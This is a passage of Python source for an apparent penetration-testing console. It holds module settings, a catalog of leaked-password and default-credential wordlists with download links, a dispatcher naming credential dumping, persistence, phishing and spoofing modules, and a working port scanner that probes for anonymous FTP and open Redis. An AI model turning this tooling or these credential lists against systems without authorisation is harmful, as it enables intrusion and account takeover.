                        'url': 'https://example.com',
                        'origin': 'https://evil.com'
                    }
                },
                'nosql_injection': {
                    'description': 'NoSQL injection tester (MongoDB, CouchDB)',
                    'options': {
                        'url': 'http://example.com/api',
                        'parameter': 'username',
                        'technique': 'auth_bypass'
                    }
                },
                'graphql_introspection': {
                    'description': 'GraphQL schema introspection',
                    'options': {
                        'url': 'https://api.example.com/graphql',
                        'output': 'schema.json'
                    }
                }
            },
            
            # Reporting
            'report': {
                'report_generator': {
                    'description': 'Generate professional pentest reports',
                    'options': {
                        'format': 'html',
                        'template': 'default',
                        'output': 'pentest_report'
                    }
                },
                'evidence_collector': {
                    'description': 'Collect evidence and screenshots',
                    'options': {
                        'session': '1',
                        'output': 'evidence.zip'
                    }
                }
            }
        }
    
    def initialize_wordlists(self):
        """Initialize common wordlists and catalog popular libraries"""
        common_passwords = [
            '123456', '123456789', '12345678', '12345', '1234', '123', '123123',
            '123qwe', '111111', '121212', '654321', '666666', '7777777', '888888',
            '999999', 'abc123', 'access', 'adidas', 'admin', 'admin123',
            'administrator', 'apple', 'baseball', 'batman', 'charlie', 'computer',
            'dragon', 'football', 'freedom', 'hello', 'iloveyou', 'letmein',
            'master', 'michael', 'monkey', 'mustang', 'password', 'password1',
            'password123', 'passw0rd', 'pokemon', 'qazwsx', 'qwerty', 'qwerty123',
            'qwertyuiop', 'shadow', 'starwars', 'sunshine', 'trustno1', 'welcome'
        ]

        self.wordlists = {
            'subdomains': [
                'www', 'mail', 'ftp', 'admin', 'webmail', 'server', 'ns1', 'ns2',
                'blog', 'api', 'dev', 'test', 'staging', 'secure', 'portal', 'vpn',
                'mx', 'smtp', 'pop', 'imap', 'web', 'en', 'es', 'fr', 'de', 'it'
            ],
            'directories': [
                'admin', 'administrator', 'backup', 'backups', 'bin', 'config',
                'configuration', 'css', 'data', 'db', 'database', 'doc', 'docs',
                'download', 'downloads', 'error', 'errors', 'images', 'img',
                'include', 'includes', 'index', 'js', 'lib', 'library', 'log',
                'logs', 'media', 'old', 'php', 'private', 'pub', 'public',
                'script', 'scripts', 'secret', 'secure', 'src', 'sql', 'static',
                'style', 'styles', 'tmp', 'temp', 'template', 'templates',
                'test', 'tests', 'upload', 'uploads', 'user', 'users', 'var',
                'web', 'webapp', 'webapps', 'wordpress', 'wp', 'wp-admin',
                'wp-content', 'wp-includes', 'xml', 'xsl'
            ],
            'passwords': common_passwords,
            'usernames': [
                'admin', 'administrator', 'root', 'user', 'test', 'guest',
                'info', 'webmaster', 'support', 'service', 'sysadmin',
                'operator', 'backup', 'postmaster', 'hostmaster', 'mail'
            ]
        }

        catalogs = []
        catalogs.extend(self.build_password_wordlist_catalog())
        catalogs.extend(self.build_username_wordlist_catalog())
        catalogs.extend(self.build_credential_wordlist_catalog())

        self.wordlists['wordlist_catalog'] = catalogs
        self.wordlists['wordlist_index'] = {}

        for entry in catalogs:
            for alias in entry['aliases']:
                alias_key = alias.lower()
                index_entry = self.wordlists['wordlist_index'].setdefault(alias_key, {})
                index_entry[entry['category']] = entry
    
    def build_password_wordlist_catalog(self):
        """Build catalog of well-known password wordlists"""
        base_dir = Path('wordlists')
        base_dir.mkdir(exist_ok=True)

        catalog = [
            {
                'category': 'password',
                'name': 'rockyou.txt',
                'aliases': ['rockyou', 'rockyou.txt'],
                'url': 'https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz',
                'compressed': 'tar.gz',
                'extract': 'rockyou.txt',
                'size': '139 MB',
                'description': 'RockYou leaked password corpus (SecLists).'
            },
            {
                'category': 'password',
                'name': 'password.lst',
                'aliases': ['john', 'john.lst', 'password.lst'],
                'url': 'https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/password.lst',
                'compressed': None,
                'extract': None,
                'size': '4.1 MB',
                'description': 'John the Ripper default password list.'
            },
            {
                'category': 'password',
                'name': 'xato-net-10-million-passwords-1000000.txt',
                'aliases': ['xato', 'xato1m', 'xato-net-1m'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt',
                'compressed': None,
                'extract': None,
                'size': '8.1 MB',
                'description': 'Top 1M passwords from the Xato corpus (SecLists).'
            },
            {
                'category': 'password',
                'name': 'darkweb2017_top-10000.txt',
                'aliases': ['darkweb2017', 'darkweb2017-top10000', 'darkweb2017_top-10000'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/darkweb2017_top-10000.txt',
                'compressed': None,
                'extract': None,
                'size': '82 KB',
                'description': 'Top 10k passwords observed in dark web leaks (SecLists).'
            }
        ]

        for entry in catalog:
            entry['path'] = base_dir / entry['name']
            entry['available'] = entry['path'].exists()

            # Also add alias without extension for convenience
            stem_alias = entry['name'].split('.')[0]
            if stem_alias.lower() not in [alias.lower() for alias in entry['aliases']]:
                entry['aliases'].append(stem_alias)

        return catalog

    def build_username_wordlist_catalog(self):
        """Catalog popular username lists"""
        base_dir = Path('wordlists')
        base_dir.mkdir(exist_ok=True)

        catalog = [
            {
                'category': 'username',
                'name': 'top-usernames-shortlist.txt',
                'aliases': ['top-usernames', 'usernames-top', 'top-usernames-shortlist'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt',
                'compressed': None,
                'extract': None,
                'size': '112 bytes',
                'description': 'Shortlist of the most common administrative usernames (SecLists).'
            },
            {
                'category': 'username',
                'name': 'cirt-default-usernames.txt',
                'aliases': ['cirt-usernames', 'default-usernames', 'cirt-default-usernames'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/cirt-default-usernames.txt',
                'compressed': None,
                'extract': None,
                'size': '11 KB',
                'description': 'CIRT compilation of default usernames across devices (SecLists).'
            },
            {
                'category': 'username',
                'name': 'xato-net-10-million-usernames.txt',
                'aliases': ['xato-usernames', 'xato-10m-users', 'xato-net-10-million-usernames'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt',
                'compressed': None,
                'extract': None,
                'size': '81 MB',
                'description': 'Xato corpus of usernames sourced from public breaches (SecLists).'
            }
        ]

        for entry in catalog:
            entry['path'] = base_dir / entry['name']
            entry['available'] = entry['path'].exists()

            stem_alias = entry['name'].split('.')[0]
            if stem_alias.lower() not in [alias.lower() for alias in entry['aliases']]:
                entry['aliases'].append(stem_alias)

        return catalog

    def build_credential_wordlist_catalog(self):
        """Catalog username:password combo lists"""
        base_dir = Path('wordlists')
        base_dir.mkdir(exist_ok=True)

        catalog = [
            {
                'category': 'credential',
                'name': 'ssh-betterdefaultpasslist.txt',
                'aliases': ['ssh-defaults', 'ssh-passlist', 'ssh-betterdefaultpasslist'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt',
                'compressed': None,
                'extract': None,
                'size': '2.0 KB',
                'description': 'Improved default SSH username:password list (SecLists).'
            },
            {
                'category': 'credential',
                'name': 'windows-betterdefaultpasslist.txt',
                'aliases': ['windows-defaults', 'windows-passlist', 'windows-betterdefaultpasslist'],
                'url': 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/windows-betterdefaultpasslist.txt',
                'compressed': None,
                'extract': None,
                'size': '9.4 KB',
                'description': 'Default Windows admin credentials in username:password format (SecLists).'
            }
        ]

        for entry in catalog:
            entry['path'] = base_dir / entry['name']
            entry['available'] = entry['path'].exists()

            stem_alias = entry['name'].split('.')[0]
            if stem_alias.lower() not in [alias.lower() for alias in entry['aliases']]:
                entry['aliases'].append(stem_alias)

        return catalog

    def find_wordlist_entry(self, name, preferred_category=None):
        """Return catalog entry for an alias, optionally constrained by category"""
        if not name:
            return None

        lookup_values = {
            name.lower(),
            Path(name).name.lower(),
            Path(name).stem.lower()
        }

        index = self.wordlists.get('wordlist_index', {})

        for value in lookup_values:
            if value in index:
                category_map = index[value]
                if preferred_category and preferred_category in category_map:
                    return category_map[preferred_category]
                # Fallback to first available entry
                if category_map:
                    return next(iter(category_map.values()))

        return None

    def resolve_wordlist_path(self, name, category='password'):
        """Resolve a wordlist alias or path to a filesystem path"""
        if not name:
            return None

        candidate = Path(name).expanduser()
        if candidate.exists():
            return str(candidate)

        local_candidate = Path('wordlists') / Path(name).name
        if local_candidate.exists():
            return str(local_candidate)

        entry = self.find_wordlist_entry(name, category)
        if entry:
            if entry['path'].exists():
                return str(entry['path'])
            primary_alias = entry['aliases'][0] if entry['aliases'] else entry['name']
            print(f"{Fore.YELLOW}[!] Wordlist '{entry['name']}' ({entry['category']}) not downloaded yet. Use 'download wordlist {primary_alias}'{Style.RESET_ALL}")

        return None

    def show_wordlists(self):
        """Display extended password wordlist catalog"""
        catalog = self.wordlists.get('wordlist_catalog', [])

        if not catalog:
            print(f"{Fore.YELLOW}⚠  No wordlist catalog entries found{Style.RESET_ALL}")
            return

        grouped = {}
        for entry in catalog:
            grouped.setdefault(entry['category'], []).append(entry)

        print(f"\n{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗")
        print(f"║            WORDLIST LIBRARIES                    ║")
        print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")

        for category, entries in sorted(grouped.items()):
            header = category.upper()
            print(f"{Fore.MAGENTA}┌─[ {header} ]─────────────────────────────{Style.RESET_ALL}")
            for entry in sorted(entries, key=lambda e: e['name'].lower()):
                status_icon = f"{Fore.GREEN}✓{Style.RESET_ALL}" if entry['available'] else f"{Fore.RED}✗{Style.RESET_ALL}"
                aliases = ', '.join(sorted(set(entry['aliases']), key=lambda a: (len(a), a))[:3])
                print(f"{Fore.WHITE}│")
                print(f"{Fore.WHITE}│ {status_icon} {Fore.YELLOW}{entry['name']}{Style.RESET_ALL}")
                print(f"{Fore.WHITE}│   {Fore.CYAN}Size:{Fore.WHITE} {entry['size']:>8}  {Fore.CYAN}Aliases:{Fore.WHITE} {aliases}")
                print(f"{Fore.WHITE}│   {Fore.BLUE}{entry['description']}{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}└──────────────────────────────────────────────{Style.RESET_ALL}\n")

        print(f"{Fore.CYAN}→ {Fore.WHITE}Download:{Fore.GREEN} download wordlist <alias>{Style.RESET_ALL}")
        print(f"{Fore.CYAN}→ {Fore.WHITE}Example: {Fore.GREEN}download wordlist rockyou{Style.RESET_ALL}\n")

    def download_wordlist(self, name):
        """Download and prepare a wordlist (passwords, usernames, or credentials)"""
        entry = self.find_wordlist_entry(name)

        if not entry:
            print(f"{Fore.RED}✗ Unknown wordlist: {Fore.WHITE}{name}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ  Use {Fore.CYAN}show wordlists{Fore.BLUE} to see available lists{Style.RESET_ALL}")
            return

        if entry['path'].exists():
            print(f"{Fore.GREEN}✓ Wordlist already available{Style.RESET_ALL}")
            print(f"{Fore.CYAN}  → {entry['path']}{Style.RESET_ALL}")
            entry['available'] = True
            return

        print(f"\n{Fore.CYAN}┌─[ DOWNLOAD INFO ]──────────────────────────────{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Name    : {Fore.YELLOW}{entry['name']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Type    : {Fore.MAGENTA}{entry['category'].upper()}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Size    : {Fore.CYAN}{entry['size']}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}│ Source  : {Fore.BLUE}{entry['url'][:50]}...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}└────────────────────────────────────────────────{Style.RESET_ALL}\n")

        confirm = input(f"{Fore.YELLOW}Download now? (y/N): {Style.RESET_ALL}").strip().lower()
        if confirm != 'y':
            print(f"{Fore.YELLOW}⊘ Download cancelled{Style.RESET_ALL}")
            return

        tmp_path = entry['path'].with_suffix(entry['path'].suffix + '.download')
        cleanup_tmp = True

        try:
            print(f"{Fore.CYAN}⟳ Downloading...{Style.RESET_ALL}")
            response = requests.get(entry['url'], stream=True, timeout=120)
            response.raise_for_status()

            total_size = int(response.headers.get('content-length', 0))
            downloaded = 0

            with open(tmp_path, 'wb') as tmp_file:
                for chunk in response.iter_content(chunk_size=1024 * 1024):
                    if chunk:
                        tmp_file.write(chunk)
                        downloaded += len(chunk)
                        if total_size > 0:
                            percent = (downloaded / total_size) * 100
                            print(f"\r{Fore.CYAN}⟳ Progress: {percent:.1f}% ({downloaded // (1024*1024)}MB / {total_size // (1024*1024)}MB){Style.RESET_ALL}", end='')
            print()  # New line after progress

            compressed = entry.get('compressed')

            if compressed == 'tar.gz':
                with tarfile.open(tmp_path, 'r:gz') as tar:
                    target_name = entry.get('extract') or entry['name']
                    member = next((m for m in tar.getmembers() if Path(m.name).name == target_name), None)
                    if not member:
                        raise ValueError(f"Target file {target_name} not found in archive")
                    extracted = tar.extractfile(member)
                    if not extracted:
                        raise ValueError(f"Could not extract {target_name}")
                    with open(entry['path'], 'wb') as dst:
                        shutil.copyfileobj(extracted, dst)
                tmp_path.unlink(missing_ok=True)

            elif compressed in ('gz', 'gzip'):
                with gzip.open(tmp_path, 'rb') as src, open(entry['path'], 'wb') as dst:
                    shutil.copyfileobj(src, dst)
                tmp_path.unlink(missing_ok=True)

            elif compressed == 'zip':
                with zipfile.ZipFile(tmp_path, 'r') as zipf:
                    target_name = entry.get('extract') or entry['name']
                    member = next((info for info in zipf.infolist() if Path(info.filename).name == target_name), None)
                    if not member:
                        raise ValueError(f"Target file {target_name} not found in archive")
                    with zipf.open(member, 'r') as src, open(entry['path'], 'wb') as dst:
                        shutil.copyfileobj(src, dst)
                tmp_path.unlink(missing_ok=True)

            else:
                os.replace(tmp_path, entry['path'])
                cleanup_tmp = False

            entry['available'] = entry['path'].exists()

            if entry['available']:
                file_size = entry['path'].stat().st_size / (1024 * 1024)
                print(f"{Fore.GREEN}✓ Download complete!{Style.RESET_ALL}")
                print(f"{Fore.CYAN}  → Location: {Fore.WHITE}{entry['path']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}  → Size: {Fore.WHITE}{file_size:.1f} MB{Style.RESET_ALL}")
                print(f"{Fore.BLUE}ℹ  Ready to use with alias: {Fore.GREEN}{entry['aliases'][0]}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}⚠  Download completed but file not accessible{Style.RESET_ALL}")

        except Exception as e:
            print(f"\n{Fore.RED}✗ Download failed: {Fore.WHITE}{str(e)}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ  Check your internet connection and try again{Style.RESET_ALL}")
        finally:
            if cleanup_tmp and tmp_path.exists():
                try:
                    tmp_path.unlink()
                except Exception:
                    pass

    def show_modules(self, category=None):
        """Display available modules"""
        print(f"\n{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗")
        print(f"║              AVAILABLE MODULES                   ║")
        print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        if category and category in self.modules:
            print(f"{Fore.YELLOW}┌─[ {category.upper()} ]─────────────────────────{Style.RESET_ALL}")
            for module_name, module_info in self.modules[category].items():
                print(f"{Fore.WHITE}│ {Fore.GREEN}{module_name:28}{Fore.WHITE}{module_info['description']}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}└──────────────────────────────────────────────{Style.RESET_ALL}")
        else:
            for category_name, modules in self.modules.items():
                print(f"\n{Fore.YELLOW}┌─[ {category_name.upper()} ]─────────────────────────{Style.RESET_ALL}")
                for module_name, module_info in modules.items():
                    print(f"{Fore.WHITE}│ {Fore.GREEN}{module_name:28}{Fore.WHITE}{module_info['description']}{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}└──────────────────────────────────────────────{Style.RESET_ALL}")
    
    def use_module(self, module_path):
        """Select a module to use"""
        category = None
        module_name = None
        
        # Parse module path
        if '/' in module_path:
            parts = module_path.split('/')
            if len(parts) == 2:
                category, module_name = parts
        else:
            # Search in all categories
            for cat, modules in self.modules.items():
                if module_path in modules:
                    category = cat
                    module_name = module_path
                    break
        
        if not category or not module_name:
            print(f"{Fore.RED}✗ Module not found: {Fore.WHITE}{module_path}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ  Use {Fore.CYAN}show modules{Fore.BLUE} to list available modules{Style.RESET_ALL}")
            return False
        
        self.current_module = f"{category}/{module_name}"
        self.module_options = self.modules[category][module_name]['options'].copy()
        
        print(f"{Fore.GREEN}✓ Module loaded: {Fore.CYAN}{self.current_module}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}→ {self.modules[category][module_name]['description']}{Style.RESET_ALL}")
        
        self.show_options()
        return True
    
    def show_options(self):
        """Show current module options"""
        if not self.current_module:
            print(f"{Fore.RED}✗ No module selected{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗")
        print(f"║            MODULE OPTIONS                        ║")
        print(f"╚══════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Module: {Fore.WHITE}{self.current_module}{Style.RESET_ALL}\n")
        
        print(f"{Fore.CYAN}{'OPTION':<25} VALUE{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─'*25} {'─'*30}{Style.RESET_ALL}")
        for option, value in self.module_options.items():
            print(f"{Fore.GREEN}{option:25}{Fore.WHITE}{value}{Style.RESET_ALL}")
        print()
    
    def set_option(self, option, value):
        """Set module option with validation"""
        if not self.current_module:
            print(f"{Fore.RED}✗ No module selected{Style.RESET_ALL}")
            return
        
        if option not in self.module_options:
            print(f"{Fore.RED}✗ Invalid option: {Fore.WHITE}{option}{Style.RESET_ALL}")
            available = ', '.join(list(self.module_options.keys())[:5])
            print(f"{Fore.BLUE}ℹ  Available options: {Fore.CYAN}{available}{Style.RESET_ALL}")
            return
        
        # Validate input based on option type
        validated_value = self._validate_option_value(option, value)
        if validated_value is None:
            print(f"{Fore.RED}✗ Invalid value for {option}: {value}{Style.RESET_ALL}")
            return
        
        self.module_options[option] = validated_value
        print(f"{Fore.GREEN}✓ {option} {Fore.WHITE}→ {Fore.CYAN}{validated_value}{Style.RESET_ALL}")
    
    def _validate_option_value(self, option, value):
        """Validate option value based on type"""
        # Common validation patterns
        if option in ['target', 'rhost', 'lhost']:
            # Validate IP or hostname
            if self.validator.validate_ip(value):
                return value
            # Allow hostnames
            if re.match(r'^[a-zA-Z0-9.-]+$', value):
                return value
            print(f"{Fore.YELLOW}[!] Invalid IP/hostname format{Style.RESET_ALL}")
            return None
        
        elif option in ['port', 'rport', 'lport']:
            # Validate port
            if self.validator.validate_port(value):
                return value
            print(f"{Fore.YELLOW}[!] Port must be between 1-65535{Style.RESET_ALL}")
            return None
        
        elif option == 'url':
            # Validate URL
            if self.validator.validate_url(value):
                return value
            print(f"{Fore.YELLOW}[!] Invalid URL format (must include http:// or https://){Style.RESET_ALL}")
            return None
        
        elif option == 'email':
            # Validate email
            if self.validator.validate_email(value):
                return value
            print(f"{Fore.YELLOW}[!] Invalid email format{Style.RESET_ALL}")
            return None
        
        elif option in ['threads', 'timeout', 'count', 'delay']:
            # Validate numeric
            try:
                num_value = int(value)
                if num_value > 0:
                    return value
                print(f"{Fore.YELLOW}[!] Value must be positive{Style.RESET_ALL}")
                return None
            except ValueError:
                print(f"{Fore.YELLOW}[!] Value must be a number{Style.RESET_ALL}")
                return None
        
        elif option == 'path':
            # Validate and sanitize path
            sanitized = self.validator.sanitize_path(value)
            if sanitized:
                return sanitized
            print(f"{Fore.YELLOW}[!] Invalid path (no directory traversal allowed){Style.RESET_ALL}")
            return None
        
        # Default: accept value as-is
        return value
    
    # ============ MODULE IMPLEMENTATIONS ============
    
    def run_module(self):
        """Execute the current module"""
        if not self.current_module:
            print(f"{Fore.RED}✗ No module selected{Style.RESET_ALL}")
            print(f"{Fore.BLUE}ℹ  Use {Fore.CYAN}use <module>{Fore.BLUE} to select a module{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.CYAN}{'═'*50}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}⚡ Executing: {Fore.WHITE}{self.current_module}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*50}{Style.RESET_ALL}\n")
        self.logger.log(f"Running module: {self.current_module}")
        
        # Parse category and module name
        parts = self.current_module.split('/')
        if len(parts) == 2:
            category, module_name = parts
        else:
            print(f"{Fore.RED}[!] Invalid module format{Style.RESET_ALL}")
            return
        
        # Route to appropriate module handler
        module_handlers = {
            # Recon modules
            'port_scanner': self.run_port_scanner,
            'subdomain_scanner': self.run_subdomain_scanner,
            'web_crawler': self.run_web_crawler,
            'network_mapper': self.run_network_mapper,
            'os_detection': self.run_os_detection,
            
            # Scan modules
            'vuln_scanner': self.run_vuln_scanner,
            'sql_scanner': self.run_sql_scanner,
            'xss_scanner': self.run_xss_scanner,
            'ssl_scanner': self.run_ssl_scanner,
            'dir_traversal': self.run_dir_traversal,
            'csrf_scanner': self.run_csrf_scanner,
            
            # Exploit modules
            'multi_handler': self.run_multi_handler,
            'sql_injection': self.run_sql_injection,
            'xss_exploit': self.run_xss_exploit,
            'command_injection': self.run_command_injection,
            'file_upload': self.run_file_upload,
            'buffer_overflow': self.run_buffer_overflow,
            
            # Password modules
            'brute_force': self.run_brute_force,
            'hash_cracker': self.run_hash_cracker,
            'spray_attack': self.run_spray_attack,
            'credential_stuffing': self.run_credential_stuffing,
            
            # Post-exploitation modules
            'shell': self.run_shell,
            'file_explorer': self.run_file_explorer,
            'privilege_escalation': self.run_privilege_escalation,
            'credential_dumper': self.run_credential_dumper,
            'persistence': self.run_persistence,
            'pivot': self.run_pivot,
            
            # Wireless modules
            'wifi_scanner': self.run_wifi_scanner,
            'wifi_cracker': self.run_wifi_cracker,
            'rogue_ap': self.run_rogue_ap,
            
            # Social engineering modules
            'phishing': self.run_phishing,
            'credential_harvester': self.run_credential_harvester,
            'website_cloner': self.run_website_cloner,
            'mass_mailer': self.run_mass_mailer,
            'qr_generator': self.run_qr_generator,
            'usb_payload': self.run_usb_payload,
            'fake_update': self.run_fake_update,
            'sms_spoofing': self.run_sms_spoofing,
            'pretexting': self.run_pretexting,
            
            # Network attack modules
            'arp_spoof': self.run_arp_spoof,
            'dns_spoof': self.run_dns_spoof,
            'dhcp_starvation': self.run_dhcp_starvation,
            'ssl_strip': self.run_ssl_strip,
            'packet_sniffer': self.run_packet_sniffer,
            
            # Web application modules
            'jwt_cracker': self.run_jwt_cracker,
            'api_fuzzer': self.run_api_fuzzer,
            'cors_scanner': self.run_cors_scanner,
            'nosql_injection': self.run_nosql_injection,
            'graphql_introspection': self.run_graphql_introspection,
            
            # Tools
            'report_generator': self.run_report_generator,
            'evidence_collector': self.run_evidence_collector,
        }
        
        if module_name in module_handlers:
            try:
                # Execute module with proper error handling
                start_time = time.time()
                module_handlers[module_name]()
                elapsed = time.time() - start_time
                
                print(f"\n{Fore.GREEN}✓ Module completed in {elapsed:.2f}s{Style.RESET_ALL}")
                self.logger.log(f"Module {module_name} completed successfully", "INFO")
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Module interrupted by user{Style.RESET_ALL}")
                self.logger.log(f"Module {module_name} interrupted", "WARNING")
                
            except ConnectionError as e:
                self.error_handler.handle_error(e, f"Connection error in {module_name}")
                
            except TimeoutError as e:
                self.error_handler.handle_error(e, f"Timeout in {module_name}")
                
            except PermissionError as e:
                self.error_handler.handle_error(e, f"Permission denied in {module_name}")
                print(f"{Fore.BLUE}ℹ  Try running with sudo/administrator privileges{Style.RESET_ALL}")
                
            except ValueError as e:
                self.error_handler.handle_error(e, f"Invalid value in {module_name}")
                
            except Exception as e:
                self.error_handler.handle_error(e, f"Executing {module_name}", fatal=True)
                
        else:
            print(f"{Fore.YELLOW}[*] Module {module_name} not yet implemented{Style.RESET_ALL}")
    
    # ============ RECON MODULES ============
    
    def run_port_scanner(self):
        """Professional port scanner with advanced service detection and vulnerability checks"""
        target = self.module_options['target']
        ports_range = self.module_options['ports']
        threads = int(self.module_options.get('threads', 50))
        timeout = float(self.module_options.get('timeout', 2))
        scan_type = self.module_options.get('scan_type', 'tcp_connect')
        aggressive = self.module_options.get('aggressive', 'false').lower() == 'true'
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║        PROFESSIONAL PORT SCANNER - KNDYS         ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.WHITE}Target:{Style.RESET_ALL}     {Fore.CYAN}{target}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Ports:{Style.RESET_ALL}      {Fore.CYAN}{ports_range}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Scan Type:{Style.RESET_ALL}  {Fore.CYAN}{scan_type}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Threads:{Style.RESET_ALL}    {Fore.CYAN}{threads}{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Timeout:{Style.RESET_ALL}    {Fore.CYAN}{timeout}s{Style.RESET_ALL}")
        print(f"{Fore.WHITE}Aggressive:{Style.RESET_ALL} {Fore.CYAN}{aggressive}{Style.RESET_ALL}\n")
        
        # Parse ports
        if '-' in ports_range:
            start, end = map(int, ports_range.split('-'))
            ports = list(range(start, end + 1))
        elif ',' in ports_range:
            ports = [int(p.strip()) for p in ports_range.split(',')]
        else:
            ports = [int(ports_range)]
        
        open_ports = []
        scan_results = {}
        vulnerabilities = []
        start_time = time.time()
        
        def grab_banner_advanced(sock, port):
            """Advanced banner grabbing with protocol-specific probes"""
            banner_info = {'raw': '', 'service': '', 'version': '', 'info': ''}
            
            try:
                if port in [80, 8080, 8000, 8888]:
                    sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                    response = sock.recv(2048).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response
                    if 'Server:' in response:
                        server_line = [line for line in response.split('\n') if line.startswith('Server:')]
                        if server_line:
                            banner_info['service'] = server_line[0].replace('Server:', '').strip()
                elif port == 443:
                    banner_info['service'] = 'HTTPS'
                elif port == 22:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response
                    if 'SSH' in response:
                        banner_info['service'] = 'SSH'
                        banner_info['version'] = response.strip()
                elif port == 21:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response
                    if '220' in response:
                        banner_info['service'] = 'FTP'
                        banner_info['version'] = response.strip()
                elif port == 25:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response
                    if '220' in response:
                        banner_info['service'] = 'SMTP'
                elif port == 3306:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    if 'mysql' in response.lower():
                        banner_info['service'] = 'MySQL'
                elif port == 6379:
                    sock.send(b'PING\r\n')
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    if 'PONG' in response:
                        banner_info['service'] = 'Redis'
                else:
                    response = sock.recv(1024).decode('utf-8', errors='ignore')
                    banner_info['raw'] = response[:200]
            except:
                pass
            
            return banner_info
        
        def check_vulnerabilities(port, banner_info):
            """Check for common vulnerabilities"""
            vulns = []
            
            if aggressive:
                try:
                    if port == 21:  # FTP Anonymous
                        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        test_sock.settimeout(timeout)
                        test_sock.connect((target, port))
                        test_sock.recv(1024)
                        test_sock.send(b'USER anonymous\r\n')
                        response = test_sock.recv(1024).decode('utf-8', errors='ignore')
                        if '230' in response or '331' in response:
                            vulns.append({'type': 'FTP Anonymous', 'severity': 'HIGH', 'description': 'FTP allows anonymous login'})
                        test_sock.close()
                    elif port == 6379:  # Redis no auth
                        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        test_sock.settimeout(timeout)
                        test_sock.connect((target, port))
                        test_sock.send(b'INFO\r\n')
                        response = test_sock.recv(4096).decode('utf-8', errors='ignore')
                        if 'redis_version' in response:
                            vulns.append({'type': 'Redis Unprotected', 'severity': 'CRITICAL', 'description': 'Redis without authentication'})
                        test_sock.close()
                    elif port == 27017:  # MongoDB
                        vulns.append({'type': 'MongoDB Exposed', 'severity': 'HIGH', 'description': 'MongoDB port publicly accessible'})
                    elif port == 9200:  # Elasticsearch
                        vulns.append({'type': 'Elasticsearch Open', 'severity': 'HIGH', 'description': 'Elasticsearch without authentication'})
                except:
                    pass
            
            return vulns
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                result = sock.connect_ex((target, port))
                
                if result == 0:
                    banner_info = grab_banner_advanced(sock, port)
                    service_name = self.get_service_name_extended(port)
                    vulns = check_vulnerabilities(port, banner_info)
                    
                    sock.close()
                    return port, True, banner_info, service_name, vulns
                sock.close()
            except Exception as e:
                pass
            return port, False, {}, '', []
        
        # Execute scan
        print(f"{Fore.BLUE}⚡ Starting advanced port scan...{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}\n")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(scan_port, port): port for port in ports}
            
            for future in concurrent.futures.as_completed(futures):
                port, is_open, banner_info, service_name, vulns = future.result()
                if is_open:
                    open_ports.append(port)
                    scan_results[port] = {
                        'service': service_name,
                        'banner': banner_info,
                        'vulnerabilities': vulns
                    }
                    
                    print(f"{Fore.GREEN}✓ {port:>5}/TCP {Fore.CYAN}OPEN  {Fore.WHITE}→ {service_name}{Style.RESET_ALL}")
                    
                    if banner_info.get('version'):
